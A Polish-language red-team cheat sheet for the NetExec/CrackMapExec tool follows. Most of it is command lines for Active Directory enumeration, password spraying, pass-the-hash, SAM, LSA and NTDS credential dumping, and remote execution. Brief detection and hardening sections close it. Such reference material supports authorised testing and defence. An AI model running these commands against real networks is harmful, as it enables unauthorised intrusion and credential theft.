---
title: "NetExec / CrackMapExec"
category: "red-team"
tags: ["tools", "active-directory", "smb"]
platform: "windows"
mitre: ["T1021", "T1087"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# NetExec (nxc) / CrackMapExec

## TL;DR
Szwajcarski scyzoryk do sieci AD: enumeracja, spray, wykonanie zdalne, zrzut sekretów po SMB/WinRM/LDAP/MSSQL/RDP. `nxc` to utrzymywany następca CME.

## Enumeracja
```bash
# Kto żyje + poziom SMB signing (relay!)
nxc smb 10.10.10.0/24
# Uwierzytelnione – shares, users, pass policy
nxc smb 10.10.10.10 -u user -p 'Pass' --shares
nxc smb 10.10.10.10 -u user -p 'Pass' --users --pass-pol
nxc smb 10.10.10.10 -u user -p 'Pass' --loggedon-users
```

## Poświadczenia
```bash
# Password spray (uważaj na lockout)
nxc smb 10.10.10.0/24 -u users.txt -p 'Sezon2026!' --continue-on-success
# Pass-the-Hash
nxc smb 10.10.10.10 -u administrator -H <NThash> --local-auth
# Zrzuty
nxc smb 10.10.10.10 -u administrator -p 'Pass' --sam --lsa
nxc smb 10.10.10.10 -u administrator -p 'Pass' -M ntdsutil   # DCSync/NTDS na DC
```

## Wykonanie / moduły
```bash
nxc smb 10.10.10.10 -u administrator -p 'Pass' -x "whoami"      # cmd
nxc winrm 10.10.10.10 -u administrator -p 'Pass' -X "$PSVersionTable"  # ps
nxc ldap 10.10.10.10 -u user -p 'Pass' --bloodhound -c All --dns-server 10.10.10.10
nxc smb 10.10.10.10 -u user -p 'Pass' -M spider_plus           # przeszukaj share'y
```

## Wykrywanie (Blue Team)
- Masowe logowania SMB/WinRM z jednego źródła, dostęp do ADMIN$/C$, 4624/4625 fala.
- `--sam/--lsa` → dostęp do LSASS/rejestru; NTDS dump na DC (4662, VSS).

## Mitygacja / Hardening
- SMB signing (blokuje relay), LAPS, tiering, ograniczenie zdalnego admina.
- Alerty na masowe uwierzytelnienia i dostęp do share administracyjnych.

## Źródła
- [NetExec](https://github.com/Pennyw0rth/NetExec)
